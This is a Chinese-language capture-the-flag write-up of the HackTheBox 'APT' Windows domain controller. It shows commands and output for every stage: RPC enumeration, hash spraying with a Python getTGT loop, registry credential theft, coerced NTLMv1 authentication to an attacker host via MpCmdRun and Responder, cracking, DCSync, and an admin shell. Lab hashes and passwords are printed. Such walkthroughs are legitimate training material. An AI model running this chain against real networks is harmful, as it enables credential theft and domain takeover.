# 信息搜集

扫端口 -> 80,135

	┌──(l1n㉿Kali)-[~]
	└─$ sudo nmap -sT -sV -O -p80,135 10.10.10.213
	Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:16 CST
	Nmap scan report for 10.10.10.213
	Host is up (0.29s latency).
	
	PORT    STATE SERVICE VERSION
	80/tcp  open  http    Microsoft IIS httpd 10.0
	135/tcp open  msrpc   Microsoft Windows RPC
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running (JUST GUESSING): Microsoft Windows 2016|10|2012|2008 (98%), Linux 2.6.X (88%)
	OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1607 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:linux:linux_kernel:2.6.32
	Aggressive OS guesses: Microsoft Windows Server 2016 (98%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Linux 2.6.32 (88%)
	No exact OS matches for host (test conditions non-ideal).
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 31.67 seconds

使用 nmap script 扫描

	┌──(l1n㉿Kali)-[~]
	└─$ sudo nmap --script=vuln -p80,135 10.10.10.213
	Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 10:20 CST
	Nmap scan report for 10.10.10.213
	Host is up (0.29s latency).
	
	PORT    STATE SERVICE
	80/tcp  open  http
	|_http-dombased-xss: Couldn't find any DOM based XSS.
	|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
	|_http-csrf: Couldn't find any CSRF vulnerabilities.
	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
	135/tcp open  msrpc

	Nmap done: 1 IP address (1 host up) scanned in 390.37 seconds

# web 端渗透

1. cms check

发现使用 HTTrack Website Copier 给 10.13.38.16 作镜像

```html
<!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:13:14 GMT -->
```

查找 HTTrack Website Copier 漏洞，发现没有存在可以使用的脚本（stack overflow ddl 注入 都没用）

2. dir or details exploit check

查看网页上的图片，也无任何提示

使用 gobuster dirsearch 爆破目录，没有找到有用的 hint

3. web check

发现 form 表单填写后会提交到 `https://10.13.38.16/contact-post.html`

```html
<div class="contact-form">
    <form method="post" action="https://10.13.38.16/contact-post.html">
        <input type="text" class="textbox" value="Name" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Name';}">
        <input type="text" class="textbox" value="Email" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Email';}">
        <textarea value="Message:" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Message';}">Message</textarea>
        <input type="submit" value="Submit">
    </form>
```

下面需要从其他端口，也就是 135 端口入手

# 135 port Microsoft Windows RPC --- python3-impacket
- [hacktricks-135 port](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
- [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- [https://www.secureauth.com/labs/open-source-tools/impacket/](https://www.secureauth.com/labs/open-source-tools/impacket/)

Impacket 专注于提供对数据包和某些协议（例如 SMB1-3 和 MSRPC）协议实现本身的低级编程访问。

在渗透测试中经常会用到

![](https://i.328888.xyz/2023/03/31/il8fzN.png)

使用 `rpcdump.py 10.10.10.213` `rpcmap.py 10.10.10.213` 查看 uuid 等数据

安装 impacket 包
```shell
git clone https://github.com/fortra/impacket.git
python3 -m pip install .
```

之后使用 examples 下的脚本

`python3 rpcdump.py 10.10.10.213` 暴露许多 UUID 和 服务名

![](https://i.328888.xyz/2023/04/02/iHHWlV.png)

之后使用 rpcmap.py 获取 135 端口上的服务映射

```shell
/tools/impacket/examples master
> python3 rpcmap.py 'ncacn_ip_tcp:10.10.10.213[135]'
Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0
```


查看 rpcmap.py --help

![](https://i.328888.xyz/2023/04/02/iHH3Lv.png)

再尝试使用 `python3 rpcmap.py 'ncacn_ip_tcp:10.10.10.213[135]'  -brute-uuids -brute-opnums` 枚举 uuid 等信息

发现存在 MS-DCOM MS-RPCE 信息有所不同，其他都是拒绝或者没有找到

```shell
/tools/impacket/examples master
> python3 rpcmap.py 'ncacn_ip_tcp:10.10.10.213[135]'  -brute-uuids -brute-opnums
Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
......
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success
Opnums 6-64: nca_s_op_rng_error (opnum not found)

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0
Opnum 0: success
Opnum 1: rpc_x_bad_stub_data
Opnum 2: success
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnums 5-64: nca_s_op_rng_error (opnum not found)

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0
Opnums 0-64: rpc_s_access_denied
......
```

对 uuid 进行探索

# IOXIDResolver

[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4): uuid=99FCFEC4-5260-101B-BBCB-00AA0021347A 对应的是  **IID_IObjectExporter** 服务

查看 opnum 所对应的服务，开启的探测主机存活

- opnum=3: ServerAlive
- opnum=5: ServerAlive2
![](https://i.328888.xyz/2023/04/02/iHOWdZ.png)

经过搜索，**发现 IID_IObjectExporter 存在漏洞可以枚举主机存活 ipv4 ipv6: 工具[https://github.com/mubix/IOXIDResolver](https://github.com/mubix/IOXIDResolver)**

![](https://i.328888.xyz/2023/04/02/iHOo93.png)

**通过 ipv4 获取到三个 ipv6 地址**

# nmap 扫描 ipv6

**端口扫描**: **同样的命令扫描出来的端口结果可能不同，尽量多扫两次**

- 53: DNS
- **88: kerberos 域控**

```shell
~/Hackthebox-APT 
> sudo nmap -6 --min-rate 10000 -p- dead:beef::b885:d62a:d679:573f
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 12:24 CST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.28s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49675/tcp open  unknown
49698/tcp open  unknown
52541/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds

> sudo nmap -6 -sU --min-rate 10000 -p- dead:beef::b885:d62a:d679:573f
[sudo] password for tel:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 12:25 CST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.27s latency).
All 65535 scanned ports on dead:beef::b885:d62a:d679:573f are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```


**nmap 指定端口探测服务及版本**

```shell
~/Hackthebox-APT 
> sudo nmap -6 -sT -sV -sC -O -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49675,49698,52541 dead:beef::b885:d62a:d679:573f
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 12:35 CST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.28s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-02 04:35:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-04-02T04:36:46+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2023-04-02T04:36:46+00:00; 0s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-04-02T04:36:46+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-04-02T04:36:46+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
52541/tcp open  msrpc        Microsoft Windows RPC
No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=6%D=4/2%OT=53%CT=%CU=%PV=N%DS=1%DC=D%G=Y%TM=64290661%P=x8
OS:6_64-pc-linux-gnu)S1(P=6000{4}28063fXX{32}0035b03cdda13a5e1e9187dda0122
OS:000c362000002040528010303080402080a0070ee1fff{4}%ST=0.141069%RT=0.41494
OS:5)S2(P=6000{4}28063fXX{32}0035b03d3c8c48451e9187dea0122000562b000002040
OS:528010303080402080a0070ee83ff{4}%ST=0.24125%RT=0.514827)S3(P=6000{4}280
OS:63fXX{32}0035b03ea779ff1d1e9187dfa0122000370100000204052801030308010108
OS:0a0070eee6ff{4}%ST=0.341022%RT=0.614254)S4(P=6000{4}28063fXX{32}0035b03
OS:f93013c9c1e9187e0a01220000a94000002040528010303080402080a0070ef4aff{4}%
OS:ST=0.441086%RT=0.713835)S5(P=6000{4}28063fXX{32}0035b040ac8370fa1e9187e
OS:1a0122000bc4c000002040528010303080402080a0070efafff{4}%ST=0.541277%RT=0
OS:.816792)S6(P=6000{4}24063fXX{32}0035b041456707171e9187e290122000a0f4000
OS:0020405280402080a0070f014ff{4}%ST=0.641018%RT=0.91536)IE1(P=6000{4}803a
OS:3fXX{32}8100caceabcd00{122}%ST=0.678635%RT=0.953953)TECN(P=602000{3}200
OS:63fXX{32}0035b042a52af2a71e9187e38052200058e500000204052801030308010104
OS:02%ST=0.877646%RT=1.1509)EXTRA(FL=12345)

Network Distance: 1 hop
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -8m33s, deviation: 22m39s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2023-04-02T05:36:31+01:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2023-04-02T04:36:33
|_  start_date: 2023-04-02T02:33:25
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.36 seconds
```

# 445 端口渗透

将 `dead:beef::b885:d62a:d679:573f htb.local` 写入 /etc/hosts

访问 htb.local 80 端口 web 服务，跟 ipv4 服务是一模一样的

## smbclient

smbclient 共享文件夹，尝试空密码列出共享目录

```shell
~/Hackthebox-APT 
> sudo smbclient -L \\htb.local
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
htb.local is an IPv6 address -- no workgroup available
```

接下来查看 backup 目录内容，匿名登录，下载到 backup.zip 文件

![](https://i.328888.xyz/2023/04/02/iHbugp.png)

其他目录都无权限，接下来仔细观察 backup.zip

# zip 密码爆破

存在 .dit 密码文件、备份文件等等

```shell
~/Hackthebox-APT
> unzip -l backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files
```

解压 zip 需要密码，这时使用特定工具进行破解

```shell
sudo zip2john backup.zip > hash4zip
```

![](https://i.328888.xyz/2023/04/02/iHj6Mp.png)

生成 hash 值，进而对 hash 值进行破解，才能破解到密码

指定一本字典，之后破解 hash

```shell
~/Hackthebox-APT 
> john hash4zip --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2023-04-02 13:24) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# 结合 SYSTEM 提取 ntds 数据

依然使用 impacket 包中脚本 secretdump.py 转储用户数据

```shell
 python3 /tools/impacket/examples/secretsdump.py LOCAL -system registry/SYSTEM -ntds Active\ Directory/ntds.dit > user_hash_raw
```

**拿到所有账号的密码 hash**

**在 evil-winrm 测试 administrator hash 是否有效，如果能登录那就可以直接 getshell** 

![](https://i.328888.xyz/2023/04/02/iH8wPL.png)

## 提取 user_list user_hash 

`cat user_hash_raw| grep ':::' | awk -F ':' '{print $1}' > user_list`

`cat user_hash_raw| grep ':::' | awk -F ':' '{print $4}' > hash_list`

# 通过Kerberos pre-auth 进行用户枚举

>used `kerbrute` to check for the valid users, and we have 3 valid users

1. nmap script

```shell
~/Hackthebox-APT 
> sudo nmap -6 -p88  --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=user_list htb.local
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 13:52 CST
Nmap scan report for htb.local (dead:beef::b885:d62a:d679:573f)
Host is up (0.27s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     Administrator@htb.local
|     APT$@htb.local
|_    henry.vinson@htb.local

Nmap done: 1 IP address (1 host up) scanned in 65.62 seconds
```

2. kerbrute

`./kerbrute_linux_386 userenum -d htb.local --dc htb.local ~/Hackthebox-APT/user_list`

## 找到与存活 user 密码匹配的 hash

**现在获取到的有三个用户名和2000个密码hash**

**目前需要爆破一下用户名和哪个密码hash是对应上的**

首先就查看 backup user 中对应的 hash 能否验证成功

![](https://i.328888.xyz/2023/04/02/iH3sCa.png)

验证失败

## 密码重用攻击

backup 文件中的密码对应不上用户名，说明如今的密码已经修改了

**有没有可能，在重新设置密码的时候把其他账号之前用过的密码，现在又用到了自己的新账号上呢？**

**爆破一下有没有与三个用户名相匹配的密码 hash 吧**

将密码 hash 写入文件
```shell
cat user_hash_raw | grep ':::' | awk -F ':' '{print $3":"$4}' > hash_list
```

### crackmapexec

`crackmapexec smb htb.local -u user_3 -H hash_list`: 但是这条命令会多次连接 smb，导致 ip 被封禁，需要寻找其他办法

>After about 60 hashes, the box stops responding entirely. It turns out it has [wail2ban](https://github.com/glasnt/wail2ban) installed, preventing this kind of bruteforce. I had to reset the box to get it back.

### getTGT (impacket)

**如果成功，则取回票据**

通过这个工具，速度更慢一些去查找有用的密码 hash

```python
import os

users = "henry.vinson"

with open("hash_list","r") as hashes:
	for hash in hashes:
		hash = hash.split()
		hash = hash[0]
		print(f"check -----> {hash}")
		os.system(f"python3 /tools/impacket/examples/getTGT.py htb.local/henry.vinson -hashes '{hash}'")
		if os.path.exists("henry.vinson.ccache"):
			break

```

获得 henry.vinson hash: aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb

>aad3b435b51404eeaad3b435b51404ee 空密码的 LM HASH

# impacket 横向移动工具

## WinRM failed

![](https://i.328888.xyz/2023/04/02/iHggIH.png)

## psexec.py failed

能列出相应的目录，但无写权限

![](https://i.328888.xyz/2023/04/02/iHge2C.png)

## wmiexec.py dcomexec.py smbexec.py failed

![](https://i.328888.xyz/2023/04/02/iHg6PX.png)

## reg.py success

注册表信息提取工具

**HKU: host key user: 存储用户凭据相关信息**

```shell
~/Hackthebox-APT
> python3 /tools/impacket/examples/reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\
Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\
HKU\\Console
HKU\\Control Panel
HKU\\Environment
HKU\\Keyboard Layout
HKU\\Network
HKU\\Software
HKU\\System
HKU\\Volatile Environment
```

![](https://i.328888.xyz/2023/04/02/iHguup.png)

	UserName        REG_SZ   henry.vinson_adm
	PassWord        REG_SZ   G1#Ny5@2dvht

# 登录 henry.vinson

![](https://i.328888.xyz/2023/04/02/iHxfT3.png)

user.txt 

![](https://i.328888.xyz/2023/04/02/iHxnAZ.png)

# 横向移动

## 信息搜集

看着红队笔记的视频找了老半天，最后找到了 powershell 历史记录

`C:\Users\{username}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`

```shell
*Evil-WinRM* PS C:\Program Files\LAPS> cat C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

[靠山吃山cheat sheet https://lolbas-project.github.io/](https://lolbas-project.github.io/#): 相当于 [https://gtfobins.github.io/](https://gtfobins.github.io/)

# MpCmdRun + Responder

控制window执行 `*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.4\noexist`

**获取一段 HTLMv1**

```shell
/tools/Responder master
> sudo python3 Responder.py -I tun0 --lm

[SMB] NTLMv1 Client   : 10.10.10.213
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

# ntlmv1-multi

```shell
/tools/ntlmv1-multi master
> python3 ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334
455667788
Hashfield Split:
['APT$', '', 'HTB', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384', '1122334455667788']

Hostname: HTB
Username: APT$
Challenge: 1122334455667788
LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
CT1: 95ACA8C7248774CB
CT2: 427E1AE5B8D5CE68
CT3: 30A49B5BB858D384

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788

To crack with hashcat create a file with the following contents:
95ACA8C7248774CB:1122334455667788
427E1AE5B8D5CE68:1122334455667788

echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

可以通过直接访问 crack.sh 获取破解之后的密钥，也可以自己本地使用 hashcat 破解，需要一些算力

`Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:  Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384 Key: d167c3238864b12f5f82feae86a7f798  This run took 32 seconds. Thank you for using crack.sh, this concludes your job.`

# secretsdump.py

![](https://i.328888.xyz/2023/04/02/iHzkUX.png)

```shell
/tools/ntlmv1-multi
> python3 /tools/impacket/examples/secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798' 'htb.local/APT$@ht
b.local'
Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
```

获取 administrator hash

使用 evil-winrm 获取 administrator shell

![](https://i.328888.xyz/2023/04/02/iHzRow.png)

`6ccc8d857db71************************`

---
# 使用工具

- nmap
- IOXIDResolver.py
- rpcclient
- rpcdump.py
- rpcmap.py
- smbclient
- zip2john
- secretsdump.py
- nmap --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=user_list htb.local
- kerbrute
- evil-winrm
- psexec.py
- smbexec.py
- wmiexec.py
- dcomexec.py
- reg.py
- HKU registry
- LM NTLM
- LoLBAS: Live off the land mindset
- responder
	- LLMNR,NBNS,MDNS
- ntlmv1-multi

